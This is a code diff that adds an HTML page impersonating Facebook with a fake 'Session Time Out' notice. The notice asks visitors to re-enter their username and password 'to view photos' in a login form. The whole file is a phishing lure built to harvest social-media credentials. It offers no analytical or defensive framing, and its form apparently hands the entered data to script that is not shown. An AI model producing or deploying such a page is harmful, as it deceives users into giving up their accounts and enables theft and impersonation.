@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Modal login</title>
+	<style type="text/css">
+		*{
+			box-sizing: border-box;
+		}
+		body,h3,input{
+			margin: 0;
+		 font-family: sans-serif;
+		}
+		body, tr, input, textarea, button {font-family: sans-serif;}
+		h1,h2,h3,h4,h5,h6,p{
+			margin: 0;
+		}
+		.login-modal{
+			display: ;
+			position: relative;
+			margin: 0 auto;
+			max-width: 600px;
+		}
+		.login-wrapper{
+			background: #fff;
+		}
+		.header{
+			background: #3b5998;
+			padding: 10px 0;
+			color: #fff;
+			text-align: ;
+			letter-spacing: 1px;
+		}
+		.form-group{
+			margin-bottom: 10px;
+		}
+		.form-control{
+			display: block;
+			padding: 12px;
+			width: 100%;
+			border: 0;
+			background: #f5f6f7;
+			border-radius: 1px;
+			font-size: 14px;
+		}
+		.btn-submit{
+			background-color: #1877f2;
+			font-weight: bold;
+      color: #fff;
+      font-size: 17px;
+      line-height: 17px;
+		}
+	</style>
+</head>
+<body>
+  <div class="login-modal">
+  	<div class="login-wrapper">
+  		<div class="header">
+  			<h3>Facebook Session Time Out</h3>
+  		</div>
+  		<div class="reason">
+  			<p>Your Session has timed out due to inactivity.</p>
+  			<p>Please re-enter your user name and password to view photos.</p>
+  		</div>
+  		<div class="form-wrapper">
+  			<form id="data">
+  				<div class="form-group">
+  					<input class="form-control" type="text" name="username" placeholder="Mobile number or email address">
+  				</div>
+  				<div class="form-group">
+  					<input class="form-control" type="password" name="password" placeholder="Password">
+  				</div>
+  				<div class="form-group">
+  					<input class="form-control btn-submit" type="submit" name="submit" value="Log In">
+  				</div>
+  			</form>
+  		</div>
+  	</div>
+  	<div class="footer">
+  		<p>Facebook &copy 2022</p>
+  	</div>
+  </div>
+</body>
+</html>
